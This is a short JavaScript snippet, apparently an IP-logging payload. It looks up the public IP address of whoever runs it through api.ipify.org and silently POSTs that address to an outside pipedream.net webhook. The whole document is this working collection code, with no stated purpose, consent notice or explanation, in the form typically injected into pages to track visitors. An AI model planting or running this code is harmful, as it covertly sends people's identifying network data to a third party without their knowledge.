fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    return fetch("https://eogiyp4bdjouqe0.m.pipedream.net", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        ip: ipData.ip
      })
    });
  });
